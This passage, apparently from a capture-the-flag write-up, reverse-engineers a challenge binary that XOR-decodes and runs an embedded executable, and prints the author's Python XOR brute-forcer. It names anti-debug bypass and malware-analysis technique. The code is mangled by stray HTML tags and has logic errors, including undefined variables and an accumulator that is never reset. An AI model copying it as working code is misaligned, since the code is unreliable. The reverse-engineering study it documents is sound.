<p>Then <a href="http://msdn.microsoft.com/en-us/library/yeby3zcb.aspx">fopen</a> is called to create/open a file named <code>gratz.exe</code> for writing in binary mode (“wb”). Then blob is written to it by calling <a href="http://msdn.microsoft.com/en-us/library/h9t88zwz.aspx">fwrite</a> and finally it is closed with <a href="http://msdn.microsoft.com/en-us/library/fxfsw25t.aspx">fclose</a>. Then command <code>gratz.exe</code> is run via the <a href="http://msdn.microsoft.com/en-us/library/277bwbdz.aspx">system</a> call. So we are writing the blob to a file and then executing it.</p>

<p>What is special about first two bytes in a Windows binary? It’s the start of the DOS stub with the magic bytes <code>MZ</code> and you have already guessed that the second argument should be <code>PE</code>.</p>

<h3 id="how-do-i-xor">How do I XOR?</h3>

<p>But how do we get the correct binary. As we have already seen, there are a series of checks and depending on the checks, different strings are xor-ed with the original blob. A correct sequence of strings will produce a correct binary. The path is probably known at this point, just bypass any Anti-VM/Anti-Debug countermeasures and other checks. But I am lazy and instead wrote a bruteforcer. In order for the bruteforcer to work, we need the original blob before any xors. That is easy. Set a breakpoint before any of the functions. Then set the Instruction Pointer to <code>00401B8D</code> and step through after the breakpoint. Stop before the <code>system</code> call and copy the <code>gratz.exe</code> file from disk.</p>

<p>Here’s my bruteforcer. This is not good code but at that point I just wanted to finish.</p>

<p><div class='bogus-wrapper'><notextile><figure class='code'><figcaption><span>bruteforcer </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
<span class='line-number'>106</span>
<span class='line-number'>107</span>
<span class='line-number'>108</span>
<span class='line-number'>109</span>
<span class='line-number'>110</span>
<span class='line-number'>111</span>
<span class='line-number'>112</span>
<span class='line-number'>113</span>
<span class='line-number'>114</span>
<span class='line-number'>115</span>
<span class='line-number'>116</span>
<span class='line-number'>117</span>
<span class='line-number'>118</span>
<span class='line-number'>119</span>
<span class='line-number'>120</span>
<span class='line-number'>121</span>
<span class='line-number'>122</span>
<span class='line-number'>123</span>
<span class='line-number'>124</span>
<span class='line-number'>125</span>
<span class='line-number'>126</span>
<span class='line-number'>127</span>
<span class='line-number'>128</span>
<span class='line-number'>129</span>
<span class='line-number'>130</span>
<span class='line-number'>131</span>
<span class='line-number'>132</span>
<span class='line-number'>133</span>
<span class='line-number'>134</span>
<span class='line-number'>135</span>
<span class='line-number'>136</span>
<span class='line-number'>137</span>
<span class='line-number'>138</span>
<span class='line-number'>139</span>
<span class='line-number'>140</span>
<span class='line-number'>141</span>
<span class='line-number'>142</span>
<span class='line-number'>143</span>
<span class='line-number'>144</span>
<span class='line-number'>145</span>
<span class='line-number'>146</span>
<span class='line-number'>147</span>
<span class='line-number'>148</span>
<span class='line-number'>149</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">key1</span><span class="o">=</span><span class="p">{}</span>
</span><span class='line'><span class="n">key1</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="err">’</span><span class="n">oh</span> <span class="n">happy</span> <span class="n">dayz</span><span class="err">’</span>
</span><span class='line'><span class="n">key1</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="err">’</span><span class="n">the</span> <span class="n">final</span> <span class="n">countdown</span><span class="err">’</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">key2</span><span class="o">=</span><span class="p">{}</span>
</span><span class='line'><span class="n">key2</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="err">’</span><span class="n">UNACCEPTABLE</span><span class="err">!’</span>
</span><span class='line'><span class="n">key2</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="err">’</span><span class="n">omglob</span><span class="err">’</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">key3</span><span class="o">=</span><span class="p">{}</span>
</span><span class='line'><span class="n">key3</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="err">’</span><span class="n">you</span>\<span class="n">x27re</span> <span class="n">so</span> <span class="n">good</span><span class="err">’</span>
</span><span class='line'><span class="n">key3</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="err">’</span><span class="n">you</span>\<span class="n">x27re</span> <span class="n">so</span> <span class="n">bad</span><span class="err">’</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">key4</span><span class="o">=</span><span class="p">{}</span>
</span><span class='line'><span class="n">key4</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="err">’</span>\<span class="n">x66</span><span class="err">’</span>
</span><span class='line'><span class="n">key4</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="err">’</span>\<span class="n">x01</span><span class="err">’</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">key5</span><span class="o">=</span><span class="p">{}</span>
</span><span class='line'><span class="n">key5</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="err">’</span><span class="n">Sandboxes</span> <span class="n">are</span> <span class="n">fun</span> <span class="n">to</span> <span class="n">play</span> <span class="ow">in</span><span class="err">’</span>
</span><span class='line'><span class="n">key5</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="err">’</span><span class="n">I</span>\<span class="n">x27m</span> <span class="n">gonna</span> <span class="n">sandbox</span> <span class="n">your</span> <span class="n">face</span><span class="err">’</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">key6</span><span class="o">=</span><span class="p">{}</span>
</span><span class='line'><span class="n">key6</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="err">’</span><span class="n">I</span> <span class="n">can</span> <span class="n">haz</span> <span class="n">decode</span><span class="err">?’</span>
</span><span class='line'><span class="n">key6</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="err">’</span><span class="n">Such</span> <span class="n">fire</span><span class="o">.</span> <span class="n">Much</span> <span class="n">burn</span><span class="o">.</span> <span class="n">Wow</span><span class="o">.</span><span class="err">’</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">key7</span><span class="o">=</span><span class="p">{}</span>
</span><span class='line'><span class="n">key7</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="err">’</span>\<span class="n">x09</span>\<span class="n">x00</span>\<span class="n">x00</span>\<span class="n">x01</span><span class="err">’</span>
</span><span class='line'><span class="n">key7</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="err">’</span><span class="n">Feel</span> <span class="n">the</span> <span class="n">sting</span> <span class="n">of</span> <span class="n">the</span> <span class="n">Monarch</span><span class="err">!’</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">key8</span><span class="o">=</span><span class="p">{}</span>
</span><span class='line'><span class="n">key8</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="err">’!</span> <span class="mi">50</span> <span class="mi">1337</span><span class="err">’</span>
</span><span class='line'><span class="n">key8</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="err">’</span><span class="mi">1337</span><span class="err">’</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">key9</span><span class="o">=</span><span class="p">{}</span>
</span><span class='line'><span class="n">key9</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="err">’</span><span class="n">LETS</span> <span class="n">GO</span> <span class="n">SHOPPING</span><span class="err">’</span>
</span><span class='line'><span class="n">key9</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="err">’</span><span class="n">MATH</span> <span class="n">IS</span> <span class="n">HARD</span><span class="err">’</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">key10</span><span class="o">=</span><span class="p">{}</span>
</span><span class='line'><span class="n">key10</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="err">’</span><span class="n">LETS</span> <span class="n">GO</span> <span class="n">MATH</span><span class="err">’</span>
</span><span class='line'><span class="n">key10</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="err">’</span><span class="n">SHOPPING</span> <span class="n">IS</span> <span class="n">HARD</span><span class="err">’</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">key11</span><span class="o">=</span><span class="p">{}</span>
</span><span class='line'><span class="n">key11</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="err">’</span>\<span class="n">x01</span>\<span class="n">x02</span>\<span class="n">x03</span>\<span class="n">x05</span>\<span class="n">x00</span>\<span class="n">x78</span>\<span class="n">x30</span>\<span class="n">x38</span>\<span class="n">x0d</span><span class="err">’</span>
</span><span class='line'><span class="n">key11</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="err">’</span>\<span class="n">x07</span>\<span class="n">x77</span><span class="err">’</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">key12</span><span class="o">=</span><span class="p">{}</span>
</span><span class='line'><span class="n">key12</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="err">”</span><span class="n">backdoge</span><span class="o">.</span><span class="n">exe</span><span class="err">”</span>
</span><span class='line'><span class="n">key12</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="err">”</span>\<span class="n">x00</span><span class="err">”</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">key13</span><span class="o">=</span><span class="p">{}</span>
</span><span class='line'><span class="n">key13</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="err">’</span><span class="mf">192.203</span><span class="o">.</span><span class="mf">230.10</span><span class="err">’</span>
</span><span class='line'><span class="n">key13</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="err">’</span>\<span class="n">x00</span><span class="err">’</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">key14</span><span class="o">=</span><span class="p">{}</span>
</span><span class='line'><span class="n">key14</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">=</span><span class="err">’</span>\<span class="n">x00</span><span class="err">’</span>
</span><span class='line'><span class="n">key14</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">=</span><span class="err">’</span><span class="n">jackRAT</span><span class="err">’</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">index</span><span class="o">=</span><span class="p">{}</span>
</span><span class='line'><span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">15</span><span class="p">):</span>
</span><span class='line'>    <span class="n">index</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span> <span class="nb">id</span><span class="o">=</span><span class="s">&quot;we-want-this-to-support-variable-length-keys&quot;</span><span class="o">&gt;</span><span class="n">we</span> <span class="n">want</span> <span class="n">this</span> <span class="n">to</span> <span class="n">support</span> <span class="n">variable</span> <span class="n">length</span> <span class="n">keys</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="c"># so if the key is smaller than data, it will wrap around</span>
</span><span class='line'><span class="k">def</span> <span class="nf">xor</span><span class="p">(</span><span class="n">mydata</span><span class="p">,</span><span class="n">mykey</span><span class="p">):</span>
</span><span class='line'>    <span class="n">keylen</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">mykey</span><span class="p">)</span>
</span><span class='line'>    <span class="n">datalen</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">mydata</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span><span class="c"># easier to just extend the key array, but probably not that memory efficient</span>
</span><span class='line'><span class="c"># not that we care about it here ;)</span>
</span><span class='line'><span class="n">key</span> <span class="o">=</span> <span class="n">mykey</span> <span class="o">*</span> <span class="p">(</span> <span class="p">(</span><span class="n">datalen</span><span class="o">/</span><span class="n">keylen</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span> <span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">return</span> <span class="s">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">a</span><span class="p">)</span> <span class="o">^</span> <span class="nb">ord</span><span class="p">(</span><span class="n">b</span><span class="p">))</span> <span class="k">for</span> <span class="n">a</span><span class="p">,</span><span class="n">b</span> <span class="ow">in</span> <span class="nb">zip</span><span class="p">(</span><span class="n">mydata</span><span class="p">,</span><span class="n">key</span><span class="p">))</span>
</span><span class='line'><span class="o">&lt;/</span><span class="n">code</span><span class="o">&gt;&lt;/</span><span class="n">pre</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kn">from</span> <span class="nn">binascii</span> <span class="kn">import</span> <span class="n">hexlify</span><span class="p">,</span> <span class="n">unhexlify</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">myfile</span> <span class="o">=</span> <span class="nb">file</span><span class="p">(</span><span class="err">‘</span><span class="n">c</span><span class="p">:</span>\<span class="n">extractedgratz</span><span class="o">.</span><span class="n">exe</span><span class="err">’</span><span class="p">,</span><span class="err">’</span><span class="n">rb</span><span class="err">’</span><span class="p">)</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">wholefile</span> <span class="o">=</span> <span class="n">myfile</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">out</span> <span class="o">=</span> <span class="n">wholefile</span><span class="p">[:</span><span class="mh">0x10</span><span class="p">]</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">myfile</span><span class="o">.</span><span class="n">close</span><span class="p">()</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="n">counter</span> <span class="o">=</span> <span class="mi">0</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="k">for</span> <span class="n">index</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
</span><span class='line'>  <span class="k">for</span> <span class="n">index</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
</span><span class='line'>    <span class="k">for</span> <span class="n">index</span><span class="p">[</span><span class="mi">3</span><span class="p">]</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
</span><span class='line'>      <span class="k">for</span> <span class="n">index</span><span class="p">[</span><span class="mi">4</span><span class="p">]</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
</span><span class='line'>        <span class="k">for</span> <span class="n">index</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
</span><span class='line'>          <span class="k">for</span> <span class="n">index</span><span class="p">[</span><span class="mi">6</span><span class="p">]</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
</span><span class='line'>            <span class="k">for</span> <span class="n">index</span><span class="p">[</span><span class="mi">7</span><span class="p">]</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
</span><span class='line'>              <span class="k">for</span> <span class="n">index</span><span class="p">[</span><span class="mi">8</span><span class="p">]</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
</span><span class='line'>                <span class="k">for</span> <span class="n">index</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
</span><span class='line'>                  <span class="k">for</span> <span class="n">index</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
</span><span class='line'>                    <span class="k">for</span> <span class="n">index</span><span class="p">[</span><span class="mi">11</span><span class="p">]</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
</span><span class='line'>                      <span class="k">for</span> <span class="n">index</span><span class="p">[</span><span class="mi">12</span><span class="p">]</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
</span><span class='line'>                        <span class="k">for</span> <span class="n">index</span><span class="p">[</span><span class="mi">13</span><span class="p">]</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
</span><span class='line'>                          <span class="k">for</span> <span class="n">index</span><span class="p">[</span><span class="mi">14</span><span class="p">]</span> <span class="ow">in</span> <span class="nb">xrange</span><span class="p">(</span><span class="mi">2</span><span class="p">):</span>
</span><span class='line'>                            <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key1</span><span class="p">[</span><span class="n">index</span><span class="p">[</span><span class="mi">1</span><span class="p">]])</span>
</span><span class='line'>                            <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key2</span><span class="p">[</span><span class="n">index</span><span class="p">[</span><span class="mi">2</span><span class="p">]])</span>
</span><span class='line'>                            <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key3</span><span class="p">[</span><span class="n">index</span><span class="p">[</span><span class="mi">3</span><span class="p">]])</span>
</span><span class='line'>                            <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key4</span><span class="p">[</span><span class="n">index</span><span class="p">[</span><span class="mi">4</span><span class="p">]])</span>
</span><span class='line'>                            <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key5</span><span class="p">[</span><span class="n">index</span><span class="p">[</span><span class="mi">5</span><span class="p">]])</span>
</span><span class='line'>                            <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key6</span><span class="p">[</span><span class="n">index</span><span class="p">[</span><span class="mi">6</span><span class="p">]])</span>
</span><span class='line'>                            <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key7</span><span class="p">[</span><span class="n">index</span><span class="p">[</span><span class="mi">7</span><span class="p">]])</span>
</span><span class='line'>                            <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key8</span><span class="p">[</span><span class="n">index</span><span class="p">[</span><span class="mi">8</span><span class="p">]])</span>
</span><span class='line'>                            <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key9</span><span class="p">[</span><span class="n">index</span><span class="p">[</span><span class="mi">9</span><span class="p">]])</span>
</span><span class='line'>                            <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key10</span><span class="p">[</span><span class="n">index</span><span class="p">[</span><span class="mi">10</span><span class="p">]])</span>
</span><span class='line'>                            <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key11</span><span class="p">[</span><span class="n">index</span><span class="p">[</span><span class="mi">11</span><span class="p">]])</span>
</span><span class='line'>                            <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key12</span><span class="p">[</span><span class="n">index</span><span class="p">[</span><span class="mi">12</span><span class="p">]])</span>
</span><span class='line'>                            <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key13</span><span class="p">[</span><span class="n">index</span><span class="p">[</span><span class="mi">13</span><span class="p">]])</span>
</span><span class='line'>                            <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key14</span><span class="p">[</span><span class="n">index</span><span class="p">[</span><span class="mi">14</span><span class="p">]])</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">pre</span><span class="o">&gt;&lt;</span><span class="n">code</span><span class="o">&gt;</span>                        <span class="k">if</span> <span class="p">(</span> <span class="n">out</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">==</span><span class="s">&#39;M&#39;</span> <span class="ow">and</span> <span class="n">out</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">==</span><span class="s">&#39;Z&#39;</span><span class="p">):</span>
</span><span class='line'>                          <span class="k">print</span> <span class="s">&quot;Found it&quot;</span>
</span><span class='line'>                          <span class="k">print</span> <span class="n">out</span>
</span><span class='line'>                          <span class="k">print</span> <span class="n">hexlify</span><span class="p">(</span><span class="n">out</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>                          <span class="n">out</span> <span class="o">=</span> <span class="n">wholefile</span>
</span><span class='line'>
</span><span class='line'>                          <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key1</span><span class="p">[</span><span class="n">ind1</span><span class="p">])</span>
</span><span class='line'>                          <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key2</span><span class="p">[</span><span class="n">ind2</span><span class="p">])</span>
</span><span class='line'>                          <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key3</span><span class="p">[</span><span class="n">ind3</span><span class="p">])</span>
</span><span class='line'>                          <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key4</span><span class="p">[</span><span class="n">ind4</span><span class="p">])</span>
</span><span class='line'>                          <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key5</span><span class="p">[</span><span class="n">ind5</span><span class="p">])</span>
</span><span class='line'>                          <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key6</span><span class="p">[</span><span class="n">ind6</span><span class="p">])</span>
</span><span class='line'>                          <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key7</span><span class="p">[</span><span class="n">ind7</span><span class="p">])</span>
</span><span class='line'>                          <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key8</span><span class="p">[</span><span class="n">ind8</span><span class="p">])</span>
</span><span class='line'>                          <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key9</span><span class="p">[</span><span class="n">ind9</span><span class="p">])</span>
</span><span class='line'>                          <span class="n">out</span> <span class="o">=</span> <span class="n">xor</span><span class="p">(</span><span class="n">out</span><span class="p">,</span><span class="n">key10</span><span class="p">[</span><span class="n">ind10</span><span class="p">])</span>
